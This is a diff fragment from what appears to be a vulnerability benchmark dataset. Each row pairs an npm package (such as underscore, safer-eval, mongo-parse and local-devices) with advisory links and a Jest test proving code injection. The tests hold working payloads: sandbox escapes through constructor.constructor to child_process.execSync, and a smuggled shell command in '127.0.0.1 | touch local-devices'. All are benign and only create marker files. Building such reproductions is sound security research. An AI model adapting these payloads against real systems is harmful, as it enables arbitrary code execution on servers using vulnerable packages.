+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(false);
+  
+  let schema = JSON.parse(
+    JSON.stringify({
+      type: ""object"",
+      properties: { username: { type: ""string"" } },
+      required: [
+        ""\""+clearImmediate.constructor(`return process;`)().mainModule.require(`child_process`).execSync('touch jsen')+\""""
+      ],
+    })
+  );
+  try {
+    const validate = jsen(schema);
+    validate({});
+  } catch (e) {}
+
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(true);
+  
+  fs.unlink(path, function (err) {});
+});
+",n/a,,https://security.snyk.io/vuln/SNYK-JS-JSEN-1014670; 
+code-injection,,modjs,0.4.0,n/a,code-injection/modjs_0.4.0,"test(""Arbitrary code execution in modjs"", () => {
+  expect.assertions(2);
+  const fs = require(""fs"");
+  const sea = require(""modjs/lib/utils/sea"");
+  const path = ""./modjs"";
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(false);
+  try {
+    sea.findSeajsConfig(
+      ""seajs.config({a: require('fs').writeFileSync('./modjs', '')})""
+    );
+  } catch (error) {}
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(true);
+  fs.unlink(path, function (err) {});
+});
+",n/a,lib/utils/sea.js:284:22,https://security.snyk.io/vuln/npm:modjs:20160407; 
+code-injection,CVE-2021-23358,underscore,1.13.0-0,1.12.1,code-injection/underscore_1.13.0-0,"test(""Arbitrary code execution in underscore"", () => {
+  expect.assertions(2);
+  const fs = require(""fs"");
+  const _ = require(""underscore"");
+  const path = ""./underscore"";
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(false);
+  _.templateSettings.variable =
+    ""a = this.constructor.constructor(`return process`)().mainModule.require(`fs`).writeFileSync(`underscore`,``)"";
+  const t = _.template("""")();
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(true);
+  fs.unlink(path, function (err) {});
+});
+",https://github.com/jashkenas/underscore/commit/4c73526d43838ad6ab43a6134728776632adeb66,modules/template.js:71:14,https://github.com/advisories/GHSA-cf4h-3jhx-xvhq; 
+code-injection,,mobile-icon-resizer,0.4.2,0.4.3,code-injection/mobile-icon-resizer_0.4.0,"test(""Arbitrary code execution in mobile-icon-resizer"", (done) => {
+  expect.assertions(2);
+  const fs = require(""fs"");
+  const pathM = require(""path"");
+  const resize = require(""mobile-icon-resizer"");
+  const path = ""./mobile-icon-resizer"";
+  
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(false);
+  
+  let options = {
+    config: pathM.resolve(__dirname, ""./config"")
+  };
+  
+  try {
+    resize(options, function (err) {});
+  } catch (e) {console.log(e)}
+  
+  file_exist = fs.existsSync(path);
+  
+  setTimeout(() => {
+    expect(file_exist).toBe(true);
+    fs.unlink(path, function (err) {});
+    done();
+  }, 500);
+});
+",https://github.com/muzzley/mobile-icon-resizer/commit/a6c50f884bd282d74ab77e1fce6317d5d0dd2f0f,lib/resize.js:31:15,https://security.snyk.io/vuln/npm:mobile-icon-resizer:20160408; https://github.com/advisories/GHSA-mxjr-xmcg-fg7w
+code-injection,CVE-2019-10759,safer-eval,1.3.1,1.3.4,code-injection/safer-eval_1.3.1,"test(""Arbitrary code execution in safer-eval"", () => {
+  expect.assertions(2);
+  const saferEval = require(""safer-eval"");
+  expect({}.polluted).toBe(undefined);
+  try {
+    saferEval(
+      ""console.constructor.constructor('return 1+(Object.prototype.polluted=`yes`)')().env""
+    );
+  } catch (error) {}
+  expect({}.polluted).toBe(""yes"");
+});
+",n/a,lib/index.js:60:17,https://github.com/advisories/GHSA-r3x4-wr4h-pw33; https://security.snyk.io/vuln/SNYK-JS-SAFEREVAL-173772
+code-injection,,kmc,1.2.2,n/a,code-injection/kmc_1.2.2,"test(""Arbitrary code execution in kmc"", () => {
+  expect.assertions(2);
+  const fs = require(""fs"");
+  let kmc = require(""kmc/lib"");
+  const path = ""./kmc"";
+  let payload = ""red(); require('fs').writeFileSync('"" + path + ""',``); //"";
+  data = {};
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(false);
+  fs.writeFileSync(
+    ""./exploit.js"",
+    ""//{requires:[require('fs').writeFileSync('kmc','')]});""
+  );
+  try {
+    kmc.analyze(""./exploit.js"");
+  } catch (e) {}
+  fs.unlinkSync(""./exploit.js"");
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(true);
+  fs.unlink(path, function (err) {});
+});
+",n/a,lib/index.js:164:43,https://security.snyk.io/vuln/npm:kmc:20160407; 
+code-injection,CVE-2020-7675,cd-messenger,2.7.24,n/a,code-injection/cd-messenger_2.7.24,"test(""Arbitrary code execution in cd-messenger"", () => {
+  expect.assertions(2);
+  const fs = require(""fs"");
+  const a = require(""cd-messenger"");
+  const path = ""./cd-messenger"";
+  let payload = ""red(); require('fs').writeFileSync('"" + path + ""',``); //"";
+  data = {};
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(false);
+  try {
+    a.line(payload);
+  } catch (error) {}
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(true);
+  fs.unlink(path, function (err) {});
+});
+",n/a,src/messenger-node.js:70:9,https://security.snyk.io/vuln/SNYK-JS-CDMESSENGER-571493; https://github.com/advisories/GHSA-v756-4whv-48vc
+code-injection,,modulify,0.1.0,n/a,code-injection/modulify_0.1.0,"test(""Arbitrary code execution in modulify"", () => {
+  expect.assertions(2);
+  const fs = require(""fs"");
+  const modulify = require(""modulify"");
+  const path = ""./modulify"";
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(false);
+  try {
+    modulify.utils.getGlobals(""require(`fs`).writeFileSync(`modulify`,``)"");
+  } catch (error) {}
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(true);
+  fs.unlink(path, function (err) {});
+});
+",n/a,src/modulify.js:74:5,https://security.snyk.io/vuln/npm:modulify:20160407; 
+code-injection,,mongo-parse,2.1.0,n/a,code-injection/mongo-parse_2.1.0,"test(""Arbitrary code execution in mongo-parse"", (done) => {
+  expect.assertions(2);
+  const fs = require(""fs"");
+  const parser = require(""mongo-parse"");
+  const path = ""./mongo-parse"";
+  
+  try {
+    if (fs.existsSync(path)) fs.unlinkSync(path);
+    console.log(""File removed:"", path);
+  } catch (err) {
+    console.error(err);
+  }
+
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(false);
+  
+  try {
+    let query = parser.parse(
+      '} + clearImmediate.constructor(`return process;`)().mainModule.require(`child_process`).execSync(""touch mongo-parse"") //'
+    );
+  } catch (error) {console.log(error)}
+  
+  setTimeout(() => {
+    file_exist = fs.existsSync(path);
+    expect(file_exist).toBe(true);
+    fs.unlink(path, () => {
+      done();
+    });
+  }, 500);
+});
+",n/a,,https://security.snyk.io/vuln/npm:mongo-parse:20160408; 
+code-injection,,local-devices,2.0.0,3.0.0,code-injection/local-devices_2.0.0,"test(""Arbitrary code execution in local-devices"", () => {
+  expect.assertions(2);
+  const fs = require(""fs"");
+  const find = require(""local-devices"");
+  const path = ""./local-devices"";
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(false);
+  let userInput = ""127.0.0.1 | touch local-devices"";
+  return find(userInput).then(() => {
+    file_exist = fs.existsSync(path);
+    expect(file_exist).toBe(true);
+    fs.unlink(path, function (err) {});
+  });
+});
+",n/a,src/index.js:114:13,https://security.snyk.io/vuln/SNYK-JS-LOCALDEVICES-459898; https://github.com/advisories/GHSA-w725-67p7-xv22
